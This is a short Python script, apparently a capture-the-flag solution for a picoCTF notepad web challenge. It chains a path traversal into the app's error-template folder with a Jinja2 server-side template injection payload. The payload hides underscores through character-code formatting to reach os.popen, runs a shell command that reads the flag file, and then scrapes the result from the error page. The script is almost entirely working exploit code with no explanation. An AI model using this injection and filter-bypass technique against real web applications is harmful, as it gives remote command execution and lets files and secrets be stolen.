import requests
import re
import html

url = "https://notepad.mars.picoctf.net/"

s = requests.Session()

# inject
dir = "../templates/errors/"
payload = dir + "{{cycler['%c%cinit%c%c'|format(95,95,95,95)]['%c%cglobals%c%c'|format(95,95,95,95)]['os'].popen('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt').read()}}"

for i in range((128 - len(dir)) // 2):
    payload = './' + payload

res = s.post(f'{url}/new', data={"content": payload.replace("/", "\\")})

if "the requested" in res.text.lower():
    print("> payload uploaded")
else:
    print("> payload failed")
    print(res.text)
    exit()

print("URL:", res.url)
error = re.findall(r'errors\/(.+).html', res.url)[0]

# display
res = s.get(f'{url}/?error={error}')

try:
    resp = re.findall(r'</h3>(.+)<h2>', res.text.replace("\n", ' '))[0]
    print(html.unescape(resp).replace("errors\\", "errors\\\n"))
except:
    print(res.text)